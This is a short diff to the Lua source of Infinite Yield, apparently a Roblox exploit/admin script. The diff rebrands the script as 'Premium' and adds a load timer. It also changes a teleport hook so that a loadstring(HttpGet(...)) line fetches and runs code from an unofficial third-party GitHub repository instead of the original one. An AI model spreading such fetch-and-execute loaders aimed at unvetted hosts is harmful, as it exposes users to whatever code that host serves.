@@ -1,3 +1,5 @@
+local p = tick()
+
 if IY_LOADED and not _G.IY_DEBUG then
 	-- error("Infinite Yield is already running!", 0)
 	return
@@ -349,7 +351,7 @@ Title.BorderSizePixel = 0
 Title.Size = UDim2.new(0, 250, 0, 20)
 Title.Font = Enum.Font.SourceSans
 Title.TextSize = 18
-Title.Text = "Infinite Yield FE v" .. currentVersion
+Title.Text = "Infinite Yield Premium FE"
 
 do
 	local emoji = ({
@@ -6475,7 +6477,7 @@ local TeleportCheck = false
 Players.LocalPlayer.OnTeleport:Connect(function(State)
 	if KeepInfYield and (not TeleportCheck) and queueteleport then
 		TeleportCheck = true
-		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()")
+		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/sadsadgwq12/infiniteyieldpremium/refs/heads/main/IYPremium.lua'))()")
 	end
 end)
 
@@ -13352,3 +13354,5 @@ task.spawn(function()
 		end
 	end
 end)
+
+notify("Infinite Yield Premium loaded in "..tick()-p.." seconds")
